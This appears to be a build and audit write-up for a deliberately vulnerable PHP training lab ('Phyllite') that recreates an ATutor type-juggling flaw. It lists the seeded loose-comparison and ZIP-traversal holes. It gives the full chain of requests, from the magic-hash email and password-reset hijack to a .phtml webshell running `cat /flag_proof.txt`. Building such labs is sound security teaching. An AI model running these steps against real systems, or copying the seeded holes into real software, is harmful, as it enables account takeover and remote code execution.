# lab-79-phyllite — ATutor Type Juggling + RCE

## Frame

**Outcome:** Working L5 PHP lab implementing the OSWE ATutor lesson 13 (Type Juggling). Students discover PHP loose comparison on a 10-char MD5 hash prefix in an unauthenticated email confirmation endpoint, brute-force a magic-hash email address to hijack teacher's email, trigger a password reset delivered to attacker-controlled inbox, authenticate, then achieve RCE via ZIP traversal + .phtml upload.

**Success line:** validate_labs.sh 0 FAIL; smoke_test.sh PASS; type juggling TRUE via `confirm.php?e=fzq@attacker.com&m=0&id=1`; password reset link captured at `/api/attacker/results.php`; reset.php accepts the link token; teacher login reveals FLAG_LOCAL; ZIP traversal + .phtml webshell lands; `?cmd=cat /flag_proof.txt` returns FLAG_PROOF; extra mile: `reset.php?id=1&m=0` bypasses WITHOUT email update step.

**Kill line:** PHP strict comparison anywhere in the confirm/reset chain would break the attack surface.

**Proof:** validate_labs.sh 73/73 PASS; smoke_test.sh PASS; all three stages + extra mile verified end-to-end.

---

## Work

### Application: Academy Learning Platform (Phyllite)

PHP 7.4 + Apache + MariaDB in a single Ubuntu 20.04 container.

**Key files:**
- `www/include/mysql_connect.inc.php` — same $addslashes=trim pattern as lesson 12; uses vsprintf-based create_sql (rabbit hole: SQL is parameterized → no injection despite trim)
- `www/profile.php?id=N` — exposes member creation_date publicly (needed for attack precomputation)
- `www/confirm.php?e=EMAIL&m=CODE&id=MEMBER_ID` — unauthenticated; `$code = substr(md5($e . $row['creation_date'] . $id), 0, 10)` then `if ($code == $m)` loose comparison → updates email
- `www/forgot_password.php` — generates reset token `substr(md5($email . $creation_date), 0, 10)`, stores in AT_password_reset, "delivers" via internal HTTP to `/attacker/collect.php`
- `www/reset.php` — POST id+m+new_password; checks `if ($stored_token == $m)` loose comparison → updates password (extra mile: teacher's reset token is `0e39054368`, a magic hash)
- `www/attacker/collect.php` + `www/api/attacker/results.php` — simulated mail relay; stores and serves captured email data
- `www/mods/_standard/tests/import_test.php` — same ZipArchive traversal + .phtml chain as lab-78

**Magic values:**
- Teacher creation_date: `2023-10-13 04:00:00`
- Reset token for teacher: `substr(md5('teacher@academy.local' + '2023-10-13 04:00:00'), 0, 10)` = `0e39054368` (magic hash)
- Magic attacker email: `fzq@attacker.com` → `substr(md5('fzq@attacker.com' + '2023-10-13 04:00:00' + '1'), 0, 10)` = `0e42603111` (magic hash)

**Attack flow (main chain):**
1. Read creation_date from `/profile.php?id=1` → `2023-10-13 04:00:00`
2. Brute-force attacker email prefix until 10-char MD5 = `0e\d+` (e.g. `fzq@attacker.com`)
3. `GET /confirm.php?e=fzq@attacker.com&m=0&id=1` → type juggling passes → teacher email updated
4. `POST /forgot_password.php` with `email=fzq@attacker.com` → reset link stored at attacker collect
5. `GET /api/attacker/results.php` → extract reset token from link
6. `POST /reset.php` with id=1 + token + new_password → password updated
7. Login as teacher → FLAG_LOCAL on dashboard
8. ZIP traversal + .phtml upload → `?cmd=cat /flag_proof.txt` → FLAG_PROOF

**Extra mile (bypass WITHOUT email update):**
1. `POST /forgot_password.php` with `email=teacher@academy.local`
2. Reset token = `0e39054368` (magic hash) stored in DB
3. `POST /reset.php` with `id=1&m=0&new_password=anything` → `0e39054368 == 0` → TRUE → password updated
4. Login → done, never needed the email

**Rabbit holes:**
- `$addslashes = 'trim'` looks injectable but SQL uses vsprintf + real_escape_string → no injection
- creation_date is needed for precomputation but not passed client-side anywhere

**Build notes:**
- Used `vsprintf`-based create_sql (not regex-split approach) to correctly handle `%s` inside SQL quoted strings
- Same Dockerfile as lab-78: php7.4-zip, php7.4-xml required; chmod 777 mods AFTER COPY

---

## Audit

- validate_labs.sh: 73/73 PASS
- smoke_test.sh: PASS
- Type juggling (confirm.php): `m=0` + magic email → "email address has been confirmed and updated" ✓
- Reset link captured at attacker collect endpoint ✓
- reset.php accepts token → password updated ✓
- Teacher login → ARENA{test_local} ✓
- Extra mile: `m=0` on reset directly (no email update) → password updated ✓
- ZIP traversal + .phtml → `XML error: Not well-formed` response ✓
- FLAG_PROOF via `?cmd=cat /flag_proof.txt`: ARENA{test_proof} ✓

**Confidence:** High. All three attack stages + extra mile verified with live containers.
